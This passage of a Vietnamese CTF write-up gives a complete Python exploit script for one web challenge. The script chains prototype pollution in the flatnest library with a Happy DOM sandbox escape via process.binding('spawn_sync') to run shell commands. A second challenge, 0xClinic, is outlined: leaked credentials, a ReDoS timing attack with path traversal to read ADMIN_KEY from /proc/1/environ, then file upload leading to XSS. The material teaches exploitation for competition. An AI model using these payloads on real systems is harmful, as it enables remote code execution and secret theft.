// trả kết quả về client bằng cách ghi đè document body
document.body.innerHTML = String.fromCharCode.apply(null, new Uint8Array(result.output[1]));
</code></pre><ul><li><p>Sử dụng lệnh <code>ls /</code> để xem tên file flag_*.txt<figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/BkaRYhOIWl.png></figure></p></li><li><p>Sau khi tìm được tên flag flag thì thay phần cấu hình thành lệnh cat:</p></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span>...
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>opts</span> <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>file</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;/bin/cat&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>args</span><span style=color:#f92672>:</span> [<span style=color:#e6db74>&#34;cat&#34;</span>, <span style=color:#e6db74>&#34;/flag_510a85c2731f7e49.txt&#34;</span>],
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>envPairs</span><span style=color:#f92672>:</span> [],
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>stdio</span><span style=color:#f92672>:</span> [
</span></span><span style=display:flex><span>        {<span style=color:#a6e22e>type</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;pipe&#34;</span>,<span style=color:#a6e22e>readable</span><span style=color:#f92672>:</span><span style=color:#66d9ef>true</span>,<span style=color:#a6e22e>writable</span><span style=color:#f92672>:</span><span style=color:#66d9ef>false</span>},
</span></span><span style=display:flex><span>        {<span style=color:#a6e22e>type</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;pipe&#34;</span>,<span style=color:#a6e22e>readable</span><span style=color:#f92672>:</span><span style=color:#66d9ef>false</span>,<span style=color:#a6e22e>writable</span><span style=color:#f92672>:</span><span style=color:#66d9ef>true</span>},
</span></span><span style=display:flex><span>        {<span style=color:#a6e22e>type</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;pipe&#34;</span>,<span style=color:#a6e22e>readable</span><span style=color:#f92672>:</span><span style=color:#66d9ef>false</span>,<span style=color:#a6e22e>writable</span><span style=color:#f92672>:</span><span style=color:#66d9ef>true</span>}
</span></span><span style=display:flex><span>    ]
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/HyJI92O8-g.png></figure></p><h2 class="relative group">Full script exploit<div id=full-script-exploit class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#full-script-exploit aria-label=Anchor>#</a></span></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> json
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Target config</span>
</span></span><span style=display:flex><span>TARGET_URL <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://challenges2.ctf.sd:35309&#34;</span> <span style=color:#75715e># Đổi IP nếu cần</span>
</span></span><span style=display:flex><span>CMD_TO_RUN <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;cat /flag_*.txt&#34;</span> <span style=color:#75715e># Lệnh cần chạy để lấy flag</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exploit</span>():
</span></span><span style=display:flex><span>    <span style=color:#75715e># Session để giữ kết nối tốt hơn</span>
</span></span><span style=display:flex><span>    s <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>Session()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[+] Step 1: Performing Prototype Pollution on flatnest...&#34;</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># Payload abuse tính năng Circular Reference của flatnest</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># polluter -&gt; Object.prototype</span>
</span></span><span style=display:flex><span>    pollution_payload <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;polluter&#34;</span>: <span style=color:#e6db74>&#34;[Circular (__proto__)]&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;polluter.settings&#34;</span>: {},
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;polluter.settings.enableJavaScriptEvaluation&#34;</span>: <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        r1 <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>post(
</span></span><span style=display:flex><span>            <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>TARGET_URL<span style=color:#e6db74>}</span><span style=color:#e6db74>/config&#34;</span>,
</span></span><span style=display:flex><span>            json<span style=color:#f92672>=</span>pollution_payload,
</span></span><span style=display:flex><span>            headers<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;Content-Type&#34;</span>: <span style=color:#e6db74>&#34;application/json&#34;</span>}
</span></span><span style=display:flex><span>        )
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[*] Pollution Response: </span><span style=color:#e6db74>{</span>r1<span style=color:#f92672>.</span>text<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[!] Error sending pollution: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[+] Step 2: Triggering RCE via Happy DOM...&#34;</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># Payload Javascript độc hại để escape sandbox và chạy lệnh hệ thống</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Dùng process.binding(&#39;spawn_sync&#39;) để chạy lệnh shell</span>
</span></span><span style=display:flex><span>    js_payload <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;script&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    try </span><span style=color:#ae81ff>{{</span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        const process = this.constructor.constructor(&#34;return process&#34;)();
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        const spawn = process.binding(&#34;spawn_sync&#34;);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        // Cấu trúc options cho spawn_sync binding
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        const opts = </span><span style=color:#ae81ff>{{</span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            file: &#39;/bin/sh&#39;,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            args: [&#39;sh&#39;, &#39;-c&#39;, &#39;</span><span style=color:#e6db74>{</span>CMD_TO_RUN<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;],
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            envPairs: [],
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            stdio: [
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                </span><span style=color:#ae81ff>{{</span><span style=color:#e6db74>type:&#39;pipe&#39;,readable:true,writable:false</span><span style=color:#ae81ff>}}</span><span style=color:#e6db74>,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                </span><span style=color:#ae81ff>{{</span><span style=color:#e6db74>type:&#39;pipe&#39;,readable:false,writable:true</span><span style=color:#ae81ff>}}</span><span style=color:#e6db74>,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                </span><span style=color:#ae81ff>{{</span><span style=color:#e6db74>type:&#39;pipe&#39;,readable:false,writable:true</span><span style=color:#ae81ff>}}</span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            ]
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        </span><span style=color:#ae81ff>}}</span><span style=color:#e6db74>;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        const result = spawn.spawn(opts);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        // result.output[1] là stdout (buffer)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        const output = String.fromCharCode.apply(null, new Uint8Array(result.output[1]));
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        const error = String.fromCharCode.apply(null, new Uint8Array(result.output[2]));
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        document.body.innerHTML = output + error;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    </span><span style=color:#ae81ff>}}</span><span style=color:#e6db74> catch(e) </span><span style=color:#ae81ff>{{</span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        document.body.innerHTML = e.toString();
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    </span><span style=color:#ae81ff>}}</span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;/script&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    render_payload <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;html&#34;</span>: js_payload
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        r2 <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>post(
</span></span><span style=display:flex><span>            <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>TARGET_URL<span style=color:#e6db74>}</span><span style=color:#e6db74>/render&#34;</span>,
</span></span><span style=display:flex><span>            json<span style=color:#f92672>=</span>render_payload,
</span></span><span style=display:flex><span>            headers<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;Content-Type&#34;</span>: <span style=color:#e6db74>&#34;application/json&#34;</span>}
</span></span><span style=display:flex><span>        )
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;-&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>30</span>)
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;[FLAG] Output retrieved:&#34;</span>)
</span></span><span style=display:flex><span>        print(r2<span style=color:#f92672>.</span>text)
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;-&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>30</span>)
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[!] Error triggering RCE: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    exploit()
</span></span></code></pre></div><h1 class="relative group">0xClinic<div id=0xclinic class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#0xclinic aria-label=Anchor>#</a></span></h1><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/SyFinLdIZe.png></figure></p><h2 class="relative group">Overview<div id=overview-2 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#overview-2 aria-label=Anchor>#</a></span></h2><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/BJeVcYO8Wl.png></figure></p><ul><li>Reg không có quyền cao và cũng không thể làm gì hơn</li></ul><h2 class="relative group">Exploit<div id=exploit-3 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#exploit-3 aria-label=Anchor>#</a></span></h2><ul><li><p>Passwd được lấy bằng national_id</p></li><li><p>Đầu tiên sẽ đi vào <code>/api/profile/patient_test</code> muốn biết được path này thì cần có kĩ năng fuzzing , và lấy được các thông tin như sau:<figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/Sy077yK8Zl.png></figure></p></li><li><p>Dựa vào thông tin này ta có thể tìm ra được <code>national_id</code> cũng như <code>passwd</code> của user : <code>patient_test</code><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/S1mu7JFI-l.png></figure></p></li><li><p>Auke lấy được account có xác thực : <code>patient_test</code> : <code>30508011601589</code></p></li><li><p>Như vậy ta đã chạm để đến các enpoint private của hệ thống</p></li><li><p>Ta sẽ lấy <code>ADMIN_KEY</code> ở file <code>proc/1/environ</code> bằng việc ReDos ; nếu thời gian delay thì kí tự ở vị trí đó là chính xác ; cứ thế ta sẽ lấy được chuỗi <code>ADMIN_KEY</code> ; path traversal chuyển về file <code>environ</code> để tìm kiếm thay vì chức năng mặc định là tìm kiếm ở file có tên được lấy với <code>username</code> người dùng<figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/BJ58LyKIbe.png></figure></p></li><li><p>Sau khi có được <code>ADMIN_KEY</code> ta mới có thể upload được file trên <code>/api/health</code> để rồi xss &mldr;&mldr;<figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/Sy1TDkFIWg.png></figure></p></li></ul><p>=================================================================</p><p>ĐƯỢC VIẾT LẠI BỞI : <strong>p1c0L0</strong> AND <strong>TIWZA</strong></p></div></div><script type=text/javascript src=/MSEC/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA==" data-oid=views_WEB/0xl4ugh/index.md data-oid-likes=likes_WEB/0xl4ugh/index.md></script></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span class="flex flex-col"><a class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" href=/MSEC/web/1762867950463-web/><span class=leading-6><span class="inline-block rtl:rotate-180">&larr;</span>&ensp;PACKAGES
</span></a><span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400"><time datetime=0001-01-01T00:00:00+00:00>1 January 0001</time>
</span></span><span class="flex flex-col items-end"><a class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" href=/MSEC/web/1761494653599-tung/><span class=leading-6>Magik&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
</span></a><span class="me-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400"><time datetime=0001-01-01T00:00:00+00:00>1 January 0001</time></span></span></div></div></footer></article><div id=scroll-to-top class="fixed bottom-24 end-6 z-50 transform translate-y-4 opacity-0 duration-200"><a href=#the-top class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400 overflow-x-auto py-2"><ul class="flex list-none flex-row"><li class="flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 me-4"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href title></a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2026</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a></p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/MSEC/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=https://mtasecurity.github.io/MSEC/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>